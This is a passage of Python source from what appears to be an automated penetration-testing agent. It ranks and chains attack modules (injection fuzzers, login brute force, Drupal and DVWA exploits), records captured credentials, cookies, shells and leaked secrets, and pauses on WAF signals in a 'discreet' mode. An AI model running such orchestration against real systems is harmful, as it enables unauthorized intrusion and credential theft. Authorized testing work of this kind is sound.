            if is_shell_operator_goal(campaign_goal):
                stop_detail += "; no remaining shell pivots"
            elif pivots:
                stop_detail += f" (pivots exhausted: {', '.join(pivots[:3])})"
            return True, no_novelty_streak, stop_detail

        if status_codes:
            noisy = [c for c in status_codes if c in HTTP_STATUS_RISK_SIGNALS]
            noisy_ratio = len(noisy) / max(1, len(status_codes))
            status_floor = 8 if state is not None and self._discreet_mode(state) else 20
            ratio_floor = 0.65 if state is not None and self._discreet_mode(state) else 0.85
            if len(status_codes) >= status_floor and noisy_ratio >= ratio_floor:
                return True, no_novelty_streak, (
                    f"{phase_name}: excessive redirect/forbidden/rate-limit noise ({len(noisy)}/{len(status_codes)})"
                )
            waf_codes = [c for c in status_codes if c in WAF_RISK_HTTP_STATUS_CODES]
            waf_floor = 1 if state is not None and self._discreet_mode(state) else 3
            marker_floor = 1 if state is not None and self._discreet_mode(state) else 2
            pause_for_waf = state is None or self._should_pause_campaign_for_waf(state)
            if pause_for_waf and (len(waf_codes) >= waf_floor or waf_markers >= marker_floor):
                return True, no_novelty_streak, (
                    f"{phase_name}: repeated blocking/WAF signals ({len(waf_codes)} status, {waf_markers} marker)"
                )

        return False, no_novelty_streak, ""

    def _update_knowledge_base_from_results(
        self,
        knowledge_base,
        results,
        module_paths,
        tech_hints,
        specializations,
        *,
        phase: str = "",
    ):
        if not isinstance(knowledge_base, dict):
            return

        observed_modules = set(knowledge_base.get("observed_modules", []))
        discovered_endpoints = set(knowledge_base.get("discovered_endpoints", []))
        discovered_params = set(knowledge_base.get("discovered_params", []))
        login_paths = set(knowledge_base.get("login_paths", []))
        kb_hints = set(knowledge_base.get("tech_hints", []))
        kb_specializations = set(knowledge_base.get("specializations", []))
        risk_signals = set(knowledge_base.get("risk_signals", []))
        tech_confidence = dict(knowledge_base.get("tech_confidence", {}))
        post_auth_catalog_paths = set(knowledge_base.get("post_auth_catalog_paths", []))
        post_auth_exploit_paths = set(knowledge_base.get("post_auth_exploit_paths", []))
        cms_base_paths = dict(knowledge_base.get("cms_base_paths", {}) or {})

        for path in module_paths or []:
            if path:
                observed_modules.add(str(path))
        for hint in tech_hints or []:
            hint_lower = str(hint).lower()
            kb_hints.add(hint_lower)
            if hint_lower in ("wordpress", "drupal", "joomla", "django", "flask", "nodejs", "api"):
                tech_confidence[hint_lower] = round(
                    max(float(tech_confidence.get(hint_lower, 0.0) or 0.0), 0.45),
                    3,
                )
            elif hint_lower in ("dvwa", "phpmyadmin"):
                tech_confidence[hint_lower] = round(
                    max(float(tech_confidence.get(hint_lower, 0.0) or 0.0), 0.45),
                    3,
                )
            elif hint_lower == "nextjs":
                tech_confidence["nextjs"] = round(
                    max(float(tech_confidence.get("nextjs", 0.0) or 0.0), 0.68),
                    3,
                )
                tech_confidence["nodejs"] = round(
                    max(float(tech_confidence.get("nodejs", 0.0) or 0.0), 0.5),
                    3,
                )
                tech_confidence["react"] = round(
                    max(float(tech_confidence.get("react", 0.0) or 0.0), 0.45),
                    3,
                )
        for sp in specializations or []:
            kb_specializations.add(str(sp).lower())

        for result in results or []:
            details = result.get("details", {}) or {}
            detail_blob = ""
            if isinstance(details, dict):
                for key in ("post_login_snippet", "post_login_final_url", "authenticated_as"):
                    val = details.get(key)
                    if isinstance(val, str) and val:
                        detail_blob += " " + val[:8000]
            msg_raw = str(result.get("message", "") or "")
            msg_lower = msg_raw.lower()
            mod_path_low = str(result.get("path", "") or "").lower()
            blob = " ".join([
                str(result.get("path", "")),
                str(result.get("module", "")),
                msg_raw,
                detail_blob,
            ])
            lower_blob = blob.lower()
            evidence_blob = self._result_evidence_blob(result)

            if result.get("vulnerable"):
                risk_signals.add("vulnerability_detected")
            if "error" in lower_blob:
                risk_signals.add("scanner_errors")
            if "sql" in lower_blob:
                risk_signals.add("sql_signal")
            if "xss" in lower_blob:
                risk_signals.add("xss_signal")
            if "lfi" in lower_blob:
                risk_signals.add("lfi_signal")
            if "ssrf" in lower_blob:
                risk_signals.add("ssrf_signal")
            if any(
                x in lower_blob
                for x in (
                    "interactive shell",
                    "meterpreter session",
                    "session opened",
                    "command shell",
                    "shell access",
                    "reverse shell",
                    "opening a shell",
                )
            ):
                risk_signals.add("interactive_shell")
                risk_signals.add("shell_obtained")

            is_positive = self._result_indicates_positive_detection(result)
            if is_positive:
                if "wordpress" in evidence_blob or "wp-content" in evidence_blob or "wp-includes" in evidence_blob:
                    tech_confidence["wordpress"] = round(min(1.0, float(tech_confidence.get("wordpress", 0.0) or 0.0) + 0.08), 3)
                if "drupal" in evidence_blob or "sites/default" in evidence_blob:
                    tech_confidence["drupal"] = round(min(1.0, float(tech_confidence.get("drupal", 0.0) or 0.0) + 0.08), 3)
                if "joomla" in evidence_blob or "com_content" in evidence_blob:
                    tech_confidence["joomla"] = round(min(1.0, float(tech_confidence.get("joomla", 0.0) or 0.0) + 0.08), 3)
                if "graphql" in evidence_blob or "swagger" in evidence_blob or "/api" in evidence_blob:
                    tech_confidence["api"] = round(min(1.0, float(tech_confidence.get("api", 0.0) or 0.0) + 0.06), 3)
                if any(token in evidence_blob for token in NEXTJS_HINT_TOKENS):
                    kb_hints.add("nextjs")
                    kb_hints.add("nodejs")
                    kb_hints.add("react")
                    tech_confidence["nextjs"] = round(max(float(tech_confidence.get("nextjs", 0.0) or 0.0), 0.78), 3)
                    tech_confidence["nodejs"] = round(max(float(tech_confidence.get("nodejs", 0.0) or 0.0), 0.55), 3)
                    tech_confidence["react"] = round(max(float(tech_confidence.get("react", 0.0) or 0.0), 0.5), 3)
            else:
                # Decay over-confident CMS hypotheses when scanners repeatedly
                # report explicit negative outcomes.
                if ("wordpress" in evidence_blob or "wp-" in evidence_blob or "wp_" in evidence_blob) and any(
                    marker in evidence_blob for marker in ("not detected", "found: 0", "no wordpress plugins", "not vulnerable")
                ):
                    tech_confidence["wordpress"] = round(max(0.0, float(tech_confidence.get("wordpress", 0.0) or 0.0) - 0.12), 3)
                if "drupal" in evidence_blob and any(marker in evidence_blob for marker in ("not detected", "found: 0", "not vulnerable")):
                    tech_confidence["drupal"] = round(max(0.0, float(tech_confidence.get("drupal", 0.0) or 0.0) - 0.12), 3)
                if "joomla" in evidence_blob and any(marker in evidence_blob for marker in ("not detected", "found: 0", "not vulnerable")):
                    tech_confidence["joomla"] = round(max(0.0, float(tech_confidence.get("joomla", 0.0) or 0.0) - 0.12), 3)

            if isinstance(details, dict):
                cms_blob = " ".join((mod_path_low, msg_lower, evidence_blob))
                if "drupal" in cms_blob:
                    base_hint = str(details.get("base_path") or details.get("path") or "").strip()
                    if base_hint.startswith("/"):
                        base_norm = "/" + base_hint.strip("/")
                        if base_norm == "//":
                            base_norm = "/"
                        cms_base_paths["drupal"] = base_norm
                        discovered_endpoints.add(base_norm)
                        discovered_endpoints.add(
                            (base_norm.rstrip("/") if base_norm != "/" else "") + "/user/login"
                        )
                        discovered_endpoints.add(
                            (base_norm.rstrip("/") if base_norm != "/" else "") + "/user/register"
                        )
                        discovered_endpoints.add(
                            (base_norm.rstrip("/") if base_norm != "/" else "") + "/sites/default"
                        )

            for endpoint in self._extract_endpoint_candidates(blob):
                discovered_endpoints.add(endpoint)
                endpoint_lower = str(endpoint).lower()
                if any(token in endpoint_lower for token in ("/login", "signin", "auth", "wp-login.php")):
                    login_paths.add(str(endpoint).split("?", 1)[0])

            for param in self._extract_param_candidates(blob):
                discovered_params.add(param)

            # e.g. admin_panel_detect: "Login panel(s): /login.php, /admin"
            if "login panel" in msg_lower and ":" in msg_raw:
                try:
                    tail = msg_raw.split(":", 1)[1]
                    for part in COMMA_SEMICOLON_SPLIT_RE.split(tail):
                        part = part.strip().strip(").")
                        if part.startswith("/"):
                            login_paths.add(part.split()[0].split("?", 1)[0])
                except Exception:
                    pass

            if isinstance(details, dict):
                findings = details.get("findings")
                sqli_rows = details.get("sqli_findings")
                if isinstance(sqli_rows, list) and sqli_rows:
                    risk_signals.add("sqli_confirmed")
                    risk_signals.add("sql_signal")
                    kb_sqli = list(knowledge_base.get("sqli_findings", []) or [])
                    for row in sqli_rows:
                        if isinstance(row, dict):
                            kb_sqli.append(row)
                    knowledge_base["sqli_findings"] = kb_sqli[-24:]
                    allowed_paths = set(
                        (knowledge_base.get("module_capability_catalog", {}) or {}).get("all_paths", []) or []
                    )
                    if HTTP_SQLI_POST_MODULE in allowed_paths:
                        post_auth_catalog_paths.add(HTTP_SQLI_POST_MODULE)
                if isinstance(findings, dict):
                    for endpoint in findings.get("endpoints", []) or []:
                        for candidate in self._extract_endpoint_candidates(str(endpoint)):
                            discovered_endpoints.add(candidate)
                            if "/api" in candidate.lower() or "graphql" in candidate.lower():
                                kb_hints.add("api")
                                risk_signals.add("api_surface_detected")
                    for src in findings.get("source_files", []) or []:
                        if src:
                            kb_hints.add("javascript")
                            risk_signals.add("js_sourcemap_recovered")
                    if findings.get("maps"):
                        risk_signals.add("js_sourcemap_recovered")
                    if findings.get("graphql_endpoint"):
                        risk_signals.add("graphql_surface_detected")
                        knowledge_base["graphql_endpoint"] = str(findings.get("graphql_endpoint"))[:256]
                    if findings.get("key_hints"):
                        risk_signals.add("leaked_secrets_detected")
                        risk_signals.add("possible_secret_literals_in_js")
                        knowledge_base["extracted_secrets"] = list(knowledge_base.get("extracted_secrets", []) or []) + [
                            {
                                "type": "client_js_secret_hint",
                                "name": str(row.get("name", ""))[:80],
                                "source": str(row.get("source", ""))[:240],
                            }
                            for row in findings.get("key_hints", [])[:20]
                            if isinstance(row, dict)
                        ]
                elif isinstance(findings, list) and "secret" in mod_path_low:
                    if findings:
                        risk_signals.add("leaked_secrets_detected")
                        risk_signals.add("possible_secret_literals_in_js")
                    knowledge_base["extracted_secrets"] = list(knowledge_base.get("extracted_secrets", []) or []) + [
                        {
                            "type": str(row.get("type", "secret_hint"))[:80],
                            "source": str(result.get("path", ""))[:200],
                        }
                        for row in findings[:20]
                        if isinstance(row, dict)
                    ]
                endpoint_rows = details.get("endpoints")
                if isinstance(endpoint_rows, list):
                    for row in endpoint_rows:
                        endpoint = row.get("endpoint") if isinstance(row, dict) else row
                        for candidate in self._extract_endpoint_candidates(str(endpoint)):
                            discovered_endpoints.add(candidate)
                            if "/api" in candidate.lower() or "graphql" in candidate.lower():
                                kb_hints.add("api")
                                risk_signals.add("api_surface_detected")
                if bool(details.get("dom_xss_suspected")) or int(details.get("dom_xss_score", 0) or 0) >= 6:
                    risk_signals.add("dom_xss_signal")
                    risk_signals.add("xss_signal")
                    kb_hints.add("dom_xss")
                if bool(details.get("login_error_decoy")):
                    risk_signals.add("login_decoy_detected")
                paths_value = details.get("paths")
                if isinstance(paths_value, str):
                    for raw_path in paths_value.split(","):
                        candidate = raw_path.strip()
                        if candidate.startswith("/"):
                            login_paths.add(candidate.split("?", 1)[0])
                login_path_hint = details.get("login_path")
                if (
                    isinstance(login_path_hint, str)
                    and login_path_hint.startswith("/")
                    and not bool(details.get("login_error_decoy"))
                ):
                    login_paths.add(login_path_hint.split("?", 1)[0])
                    risk_signals.add("login_surface_detected")

            # simple_login_scanner: path only in free-text reason
            if "login page detected on" in msg_lower:
                m = LOGIN_PAGE_PATH_IN_MESSAGE_RE.search(msg_raw)
                if m:
                    login_paths.add(m.group(1).split("?", 1)[0])
                    risk_signals.add("login_surface_detected")

            if "admin_login_bruteforce" in mod_path_low:
                lp_hint = None
                if isinstance(details, dict):
                    lp_hint = details.get("login_path") or details.get("target_path")
                if not isinstance(lp_hint, str) or not lp_hint.startswith("/"):
                    lp_hint = self._select_best_login_path(knowledge_base)
                if isinstance(lp_hint, str) and lp_hint.startswith("/"):
                    lp_norm = lp_hint.split("?", 1)[0]
                    auth_in_details = isinstance(details, dict) and (
                        details.get("post_login_snippet")
                        or details.get("post_login_final_url")
                        or details.get("authenticated_as")
                    )
                    strong_success = auth_in_details or (
                        "valid credential" in msg_lower
                        or "authenticated as" in msg_lower
                    )
                    if not strong_success and any(
                        x in msg_lower
                        for x in (
                            "no valid",
                            "no credential",
                            "exhausted",
                            "could not find",
                            "failed after",
                            "attempts exhausted",
                        )
                    ):
                        lst = knowledge_base.setdefault("auth_bruteforce_exhausted_login_paths", [])
                        if lp_norm not in lst:
                            lst.append(lp_norm)

            if result.get("vulnerable") and any(
                token in mod_path_low
                for token in ("login_page_detector", "simple_login_scanner", "admin_panel_detect")
            ) and not (isinstance(details, dict) and bool(details.get("login_error_decoy"))):
                risk_signals.add("login_surface_detected")

            auth_context = self._extract_auth_context_from_details(
                str(result.get("path", "")),
                details,
            )
            if auth_context:
                self._merge_auth_context(knowledge_base, auth_context)
                risk_signals.add("credentials_obtained")
                if auth_context.get("cookies"):
                    risk_signals.add("session_cookie_obtained")

            session_id = str(
                result.get("session_id")
                or (details.get("session_id") if isinstance(details, dict) else "")
                or ""
            ).strip()
            ssh_shell_win = bool(
                session_id
                and (
                    "ssh_login" in mod_path_low
                    or "ssh login succeeded" in msg_lower
                    or ("ssh" in mod_path_low and "login succeeded" in msg_lower)
                )
            )
            if ssh_shell_win or (
                session_id
                and any(token in mod_path_low for token in ("/ssh/", "ssh_login", "shell"))
                and result.get("vulnerable")
            ):
                risk_signals.update({
                    "shell_obtained",
                    "interactive_shell",
                    "authenticated_session",
                    "credentials_obtained",
                })
                knowledge_base.setdefault("verified_session_ids", [])
                ids = knowledge_base["verified_session_ids"]
                if isinstance(ids, list) and session_id not in ids:
                    ids.append(session_id)

            if isinstance(details, dict) and (
                details.get("post_login_snippet") or details.get("post_login_final_url")
            ):
                risk_signals.add("authenticated_session")
                context = self._get_active_auth_context(knowledge_base)
                excerpt = (
                    context.get("post_login_snippet")
                    or str(details.get("post_login_snippet") or "")[:12000]
                )
                knowledge_base["authenticated_page_excerpt"] = excerpt
                knowledge_base["auth_milestone"] = {
                    "stage": "post_login",
                    "source": "credential_probe",
                    "module": str(result.get("path", ""))[:200],
                    "login_path": context.get("login_path", ""),
                    "landing_path": context.get("final_path", ""),
                }
                resolved_catalog = self._resolve_catalog_paths_from_text(
                    knowledge_base, excerpt, max_paths=30
                )
                for candidate_path in resolved_catalog:
                    post_auth_catalog_paths.add(candidate_path)
                    low = str(candidate_path).lower()
                    if low.startswith("exploit/") or low.startswith("exploits/"):
                        post_auth_exploit_paths.add(candidate_path)
                explicit_apps = self._detect_app_stack_markers(
                    " ".join([
                        excerpt,
                        str(context.get("final_path", "") or ""),
                        str(context.get("final_url", "") or ""),
                        str(result.get("message", "") or ""),
                    ])
                )
                for app in explicit_apps:
                    kb_hints.add(app)
                    if app == "dvwa":
                        tech_confidence["dvwa"] = round(
                            max(float(tech_confidence.get("dvwa", 0.0) or 0.0), 0.95),
                            3,
                        )
                        allowed = set(knowledge_base.get("module_capability_catalog", {}).get("all_paths", []) or [])
                        for path in (
                            "exploits/ctf/dvwa_rce",
                            "exploits/ctf/dvwa_file_upload",
                        ):
                            if path in allowed:
                                post_auth_catalog_paths.add(path)
                                post_auth_exploit_paths.add(path)
                dynamic_keywords = self._extract_adaptive_keywords(blob)
                for keyword in self._match_keywords_to_catalog(knowledge_base, dynamic_keywords):
                    kb_hints.add(keyword)

            if is_positive:
                dynamic_keywords = self._extract_adaptive_keywords(evidence_blob)
                for keyword in self._match_keywords_to_catalog(knowledge_base, dynamic_keywords):
                    kb_hints.add(keyword)

            self._merge_module_produces_into_kb(
                knowledge_base,
                str(result.get("path", "") or ""),
                details,
            )

        knowledge_base["observed_modules"] = sorted(observed_modules)
        knowledge_base["discovered_endpoints"] = sorted(discovered_endpoints)
        knowledge_base["discovered_params"] = sorted(discovered_params)
        knowledge_base["login_paths"] = sorted(login_paths)[:40]
        knowledge_base["tech_hints"] = sorted(kb_hints)
        knowledge_base["tech_confidence"] = tech_confidence
        knowledge_base["specializations"] = sorted(kb_specializations)
        knowledge_base["risk_signals"] = sorted(risk_signals)
        knowledge_base["post_auth_catalog_paths"] = sorted(post_auth_catalog_paths)[:40]
        knowledge_base["post_auth_exploit_paths"] = sorted(post_auth_exploit_paths)[:20]
        if cms_base_paths:
            knowledge_base["cms_base_paths"] = cms_base_paths
        self._promote_corroborated_web_apps(knowledge_base)

        meta_map: Dict[str, Any] = {}
        for result in results or []:
            if not isinstance(result, dict):
                continue
            path = str(result.get("path", "") or "").strip()
            if path and path not in meta_map:
                meta_map[path] = self._catalog.get_agent_metadata(path) or {}
        sync_chain_context_to_kb(knowledge_base, results or [])
        poison_kb_from_results(
            knowledge_base,
            results or [],
            phase=phase,
            module_agent_meta=meta_map,
        )
        if knowledge_base.get("expanded_surface"):
            root = organization_root_domain(
                str(knowledge_base.get("target_hostname") or "")
            )
            if not root:
                root = ""
            identities = harvest_identities_from_results(results or [], root_domain=root)
            subdomains = harvest_subdomains_from_results(results or [], root_domain=root)
            if identities or subdomains:
                merge_intel_into_knowledge_base(
                    knowledge_base,
                    identities=identities,
                    subdomains=subdomains,
                    username_candidates=build_username_candidates(identities),
                    password_candidates=harvest_password_candidates_from_results(
                        results or [],
                        identities=identities,
                        root_domain=root,
                    ),
                )
        knowledge_base["attack_chain_summary"] = export_chain_summary(knowledge_base)
        merge_ot_context_from_results(knowledge_base, results, module_paths)
        sync_attack_graph_from_kb(
            knowledge_base,
            hostname=str(knowledge_base.get("target_hostname") or ""),
            module_paths=list(module_paths or []),
            results=[r for r in (results or []) if isinstance(r, dict)],
        )
        sync_branches_from_results(
            knowledge_base,
            [r for r in (results or []) if isinstance(r, dict)],
        )

    def _select_best_login_path(self, knowledge_base):
        return self._auth_ops.select_best_login_path(knowledge_base)

    def _build_inferred_option_overrides(self, modules, state: AgentState):
        overrides = self._auth_ops.build_inferred_option_overrides(modules, state)
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        cms_base_paths = kb.get("cms_base_paths", {}) if isinstance(kb.get("cms_base_paths", {}), dict) else {}
        drupal_base = str(cms_base_paths.get("drupal") or "").strip()
        if not drupal_base:
            path_hints = list(kb.get("discovered_endpoints", []) or [])
            path_hints.extend(kb.get("login_paths", []) or [])
            for endpoint in path_hints:
                endpoint_text = str(endpoint or "").strip()
                if "/drupal/" in endpoint_text.lower() or endpoint_text.lower() == "/drupal":
                    drupal_base = "/drupal"
                    break
        chain_overrides = build_chain_context_option_overrides(modules, kb)
        for path, opts in chain_overrides.items():
            if not isinstance(opts, dict) or not opts:
                continue
            merged = dict(overrides.get(path) or {})
            merged.update(opts)
            overrides[path] = merged
        if drupal_base:
            drupal_base = "/" + drupal_base.strip("/")
            if drupal_base == "//":
                drupal_base = "/"
            for module in modules or []:
                module_path = str(module.get("path", "")).strip()
                if not module_path or "drupal" not in module_path.lower():
                    continue
                merged = dict(overrides.get(module_path) or {})
                merged.setdefault("path", drupal_base)
                merged.setdefault("base_path", drupal_base)
                if module_path.lower().endswith("drupal_rce") and drupal_base != "/":
                    merged.setdefault("exploit_path", drupal_base.rstrip("/") + "/user/register")
                overrides[module_path] = merged
        overrides = merge_crawler_overrides(overrides, kb, state)
        return overrides

    def _extract_endpoint_candidates(self, text):
        candidates = set()
        # Pull absolute URLs and keep only path/query part for dedup.
        for match in ABSOLUTE_URL_RE.findall(text or ""):
            try:
                parsed = urllib.parse.urlparse(match)
                path = parsed.path or "/"
                if parsed.query:
                    path = f"{path}?{parsed.query}"
                candidates.add(path[:200])
            except Exception:
                continue

        # Pull path-looking tokens.
        for match in ENDPOINT_RE.findall(text or ""):
            endpoint = match.strip()
            if len(endpoint) >= 2:
                candidates.add(endpoint[:200])
        return candidates

    def _extract_param_candidates(self, text):
        params = set()
        for key, _ in PARAM_RE.findall(text or ""):
            params.add(key.lower())
        return params

    def _take_unseen_modules(self, modules, executed_paths, limit):
        selected = []
        for module in modules:
            path = module.get("path")
            if not path or path in executed_paths:
                continue
            selected.append(module)
            if len(selected) >= limit:
                break
        return selected

    def _score_module_by_rules(self, module: dict, rules: ModuleScoreRules) -> int:
        """Sum weights for rules where any token appears in the module metadata blob (lowercased)."""
        return score_rules(module_blob_lower(module), rules)

    def _select_modules_opportunistic(
        self,
        candidates,
        state: AgentState,
        tech_hints: set,
        executed_paths: set,
        limit: int,
    ):
        """
        Rank unseen modules by utility (expected information gain / estimated network cost),
        instead of static pool order alone.
        """
        candidates = self._filter_catalog_candidates_for_policy(
            state,
            [m for m in (candidates or []) if isinstance(m, dict)],
            phase=str(getattr(state, "current_phase", "") or "catalog"),
        )
        return select_opportunistic_batch(
            candidates,
            state.knowledge_base,
            tech_hints,
            executed_paths,
            limit,
            self._module_perf,
            self._module_ctx,
            self._module_health,
        )

    def _build_module_decision_report(
        self,
        module: Dict[str, Any],
        state: AgentState,
        tech_hints: set,
        executed_paths: set,
        *,
        phase_label: str = "",
        candidate_pool: Optional[List[Dict[str, Any]]] = None,
    ) -> Dict[str, Any]:
        path = str(module.get("path", "") or "").strip()
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        score = unified_module_score(
            module,
            kb,
            tech_hints,
            executed_paths,
            self._module_perf,
            self._module_ctx,
            self._module_health,
        )
        reason = self._action_reason_for_path(
            path,
            state,
            state.contextual_findings or state.vulnerable_results,
        )
        scored: List[tuple] = []
        policy_rejected: List[Dict[str, str]] = []
        for row in candidate_pool or []:
            if not isinstance(row, dict) or not row.get("path"):
                continue
            row_path = str(row.get("path", "") or "").strip()
            block_reason = self._module_block_reason_for_profile(state, row_path, row)
            if block_reason:
                policy_rejected.append({
                    "path": row_path,
                    "reason": f"blocked by policy: {block_reason}",
                })
                continue
            g = unified_module_score(
                row,
                kb,
                tech_hints,
                executed_paths,
                self._module_perf,
                self._module_ctx,
                self._module_health,
            )
            if g is None:
                g = -1.0
            scored.append((float(g), row))
        scored.sort(key=lambda item: (item[0], str(item[1].get("path", ""))), reverse=True)

        from interfaces.command_system.builtin.agent.decision_report import infer_rejected_scored_alternatives

        rejected = infer_rejected_scored_alternatives(path, candidate_pool or [], scored)
        rejected = policy_rejected[:4] + [
            row for row in rejected
            if row.get("path") not in {item.get("path") for item in policy_rejected}
        ]
        matching = self._action_matching_findings(path, state.contextual_findings or state.vulnerable_results)
        low = path.lower()
        risk_cost = float(estimate_network_cost(low))
        evidence, tradeoffs = self._module_memory_decision_notes(path, state)
        return build_action_decision_report(
            path,
            "run_module",
            kb,
            campaign_goal=str(getattr(state, "campaign_goal", "") or ""),
            reason=reason,
            matching_finding=matching[0] if matching else None,
            stack_mismatch_fn=self._module_stack_mismatch_reason,
            rejected_alternatives=rejected,
            evidence=evidence,
            tradeoffs=tradeoffs,
            score=float(score or 0.0),
            confidence=0.55 if score and score > 0 else 0.35,
            risk_cost=risk_cost,
        )

    def _module_memory_decision_notes(
        self,
        path: str,
        state: AgentState,
    ) -> Tuple[List[str], List[str]]:
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        evidence: List[str] = []
        tradeoffs: List[str] = []
        if not path:
            return evidence, tradeoffs
        try:
            perf = float(self._module_perf.utility_multiplier(path, kb))
            profile = classify_target_profile(kb)
            evidence.append(f"performance_memory={perf:.2f}@{profile}")
            if perf < 0.9:
                tradeoffs.append(f"historical performance down-weighted ({perf:.2f})")
            elif perf > 1.08:
                evidence.append("historical performance boosted")
        except Exception:
            pass
        try:
            ctxm = float(self._module_ctx.context_multiplier(path, kb))
            context = classify_operational_context(kb)
            evidence.append(f"context_memory={ctxm:.2f}@{context}")
            if ctxm < 0.9:
                tradeoffs.append(f"context memory down-weighted ({ctxm:.2f})")
            elif ctxm > 1.08:
                evidence.append("context memory boosted")
        except Exception:
            pass
        try:
            health = float(self._module_health.health_multiplier(path, kb))
            evidence.append(f"health_memory={health:.2f}")
            if health < 0.85:
                tradeoffs.append(f"recent failures down-weighted ({health:.2f})")
        except Exception:
            pass
        return evidence[:6], tradeoffs[:4]

    def _log_opportunistic_pick(
        self,
        phase_label: str,
        selected: list,
        state: AgentState,
        tech_hints: set,
        executed_paths_before: set,
        *,
        candidate_pool: Optional[List[Dict[str, Any]]] = None,
    ) -> None:
        if not selected:
            return
        if state.verbose:
            parts = []
            for m in selected[:6]:
                path = m.get("path", "") or ""
                tail = path.split("/")[-1] if path else "?"
                u = unified_module_score(
                    m,
                    state.knowledge_base,
                    tech_hints,
                    executed_paths_before,
                    self._module_perf,
                    self._module_ctx,
                    self._module_health,
                )
                parts.append(f"{tail}={u:.2f}")
            kb_s = information_score_kb(state.knowledge_base)
            print_info(
                f"[{phase_label}] opportunistic utility order | KB info≈{kb_s:.2f} | " + ", ".join(parts)
            )
        for module in selected[:8]:
            if not isinstance(module, dict):
                continue
            report = self._build_module_decision_report(
                module,
                state,
                tech_hints,
                executed_paths_before,
                phase_label=phase_label,
                candidate_pool=candidate_pool,
            )
            path = str(module.get("path", "") or "")
            self._append_timeline_event(
                state,
                phase_label,
                str(report.get("chosen", path))[:240],
                kind="module_decision",
                modules=[module],
                extra={"decision_explanation": report, "path": path},
            )
            if state.verbose:
                rejected = report.get("rejected_alternatives", []) or []
                if rejected:
                    alt = rejected[0]
                    print_info(
                        f"  not {alt.get('path', '?').split('/')[-1]}: "
                        f"{self._shorten_text(str(alt.get('reason', '')), 90)}"
                    )
            try:
                rejected = report.get("rejected_alternatives", []) or []
                if rejected:
                    self._learning.record_preferences(
                        state,
                        chosen_path=path,
                        rejected_alternatives=rejected,
                        outcome=phase_label,
                    )
            except Exception:
                pass
            if state.verbose:
                pivot = str(report.get("next_pivot", "") or "")
                if pivot:
                    print_info(f"  next pivot: {pivot.split('/')[-1]}")

    def _pick_crawler_modules(self, modules):
        crawler_keywords = (
            "crawler", "crawl", "spider", "robots", "sitemap", "spa_scanner",
            "directory_listing", "admin_panel_detect",
        )
        rules = [(1, crawler_keywords)]
        picked = []
        for module in modules:
            blob = module_blob_lower(module)
            if score_rules(blob, rules) > 0:
                picked.append(module)
        return picked

    def _pick_injection_modules(self, modules, knowledge_base=None):
        cms_lock = self._get_cms_lock_specializations(knowledge_base or {})
        if cms_lock:
            # Hard block: when CMS is confidently identified, avoid generic
            # injection fuzzers and rely on CMS-specific scanners/follow-ups.
            return []
        injection_keywords = (
            "sqli_engine", "sql_injection", "sqli", "django_sqli", "xss", "lfi", "rfi", "ssrf",
            "xxe", "injection", "fuzzer", "smuggling", "cors", "csp_bypass",
            "bypass_403", "bypass_404",
        )
        injection_rules = [(1, injection_keywords)]
        param_profile = self._build_param_profile(knowledge_base or {})
        picked = []
        ranked = []
        strong_wp = self._has_tech_evidence(knowledge_base or {}, "wordpress", threshold=0.65)
        for module in modules:
            path = module_path_lower(module)
            blob = module_blob_lower(module)
            if score_rules(blob, injection_rules) <= 0:
                continue
            if not strong_wp and (
                "wordpress_madara" in path
                or "wordpress_madara" in blob
                or "wp_plugin_exclusive" in path
                or "wp_plugin_exclusive" in blob
            ):
                continue
            picked.append(module)
            score = self._score_injection_module_by_profile(blob, param_profile)
            ranked.append((score, module))

        # Keep context-relevant modules first, but do not drop all generic fallbacks.
        ranked.sort(key=lambda item: item[0], reverse=True)
        prioritized = [module for score, module in ranked if score > 0]
        fallback = [module for score, module in ranked if score <= 0]
        return prioritized + fallback

    def _build_param_profile(self, knowledge_base):
        params = set([str(p).lower() for p in knowledge_base.get("discovered_params", [])])
        endpoints = [str(e).lower() for e in knowledge_base.get("discovered_endpoints", [])]

        profile = {
            "params": params,
            "has_query": any("?" in endpoint for endpoint in endpoints),
            "has_api": any("/api" in endpoint or "graphql" in endpoint for endpoint in endpoints),
            "id_like": any(p in params for p in ("id", "user_id", "uid", "item", "product", "post")),
            "search_like": any(p in params for p in ("q", "query", "search", "term", "keyword", "filter")),
            "url_like": any(p in params for p in ("url", "uri", "redirect", "callback", "endpoint", "link")),
            "file_like": any(p in params for p in ("file", "path", "page", "include", "template", "view")),
            "text_like": any(p in params for p in ("message", "comment", "content", "title", "name")),
        }
        return profile

    def _score_injection_module_by_profile(self, blob, profile):
        score = 0
        if "sql" in blob:
            if profile["id_like"] or profile["search_like"]:
                score += 4
            if profile["has_query"]:
                score += 1
        if "xss" in blob:
            if profile["text_like"] or profile["search_like"]:
                score += 4
            if profile["has_query"]:
                score += 1
        if "ssrf" in blob:
            if profile["url_like"]:
                score += 4
        if "lfi" in blob:
            if profile["file_like"]:
                score += 4
        if "api_fuzzer" in blob or "graphql" in blob:
            if profile["has_api"]:
                score += 3
        if any(k in blob for k in ("fuzzer", "injection", "smuggling")):
            score += 1
        return score

    def _detect_specializations(self, tech_hints, results, knowledge_base=None):
        """
        Determine adaptive specialization buckets from hints + scan outcomes.
        """
        corpus = set([str(h).lower() for h in tech_hints])
        for result in results:
            if not self._result_indicates_positive_detection(result):
                continue
            if not self._result_has_explicit_evidence(result):
                continue
            blob = self._result_evidence_blob(result)
            for token in CMS_SPECIALIZATION_BLOB_TOKENS:
                if token in blob:
                    corpus.add(token)

        confidence = {}
        if isinstance(knowledge_base, dict):
            confidence = knowledge_base.get("tech_confidence", {}) or {}

        specializations = set()
        if any(t in corpus for t in ("wordpress", "wp")):
            specializations.add("wordpress")
        if "drupal" in corpus:
            specializations.add("drupal")
        if "joomla" in corpus:
            specializations.add("joomla")
        if float(confidence.get("wordpress", 0.0) or 0.0) >= 0.75:
            specializations.add("wordpress")
        if float(confidence.get("drupal", 0.0) or 0.0) >= 0.75:
            specializations.add("drupal")
        if float(confidence.get("joomla", 0.0) or 0.0) >= 0.75:
            specializations.add("joomla")
        if any(t in corpus for t in ("django", "flask", "fastapi", "python")):
            specializations.add("python_web")
        if any(t in corpus for t in ("nodejs", "nextjs", "react", "angular", "vue")):
            specializations.add("node_web")
        if "nextjs" in corpus or float(confidence.get("nextjs", 0.0) or 0.0) >= 0.6:
            specializations.add("nextjs")
            specializations.add("node_web")
        if any(t in corpus for t in ("api", "swagger", "graphql")):
            specializations.add("api")
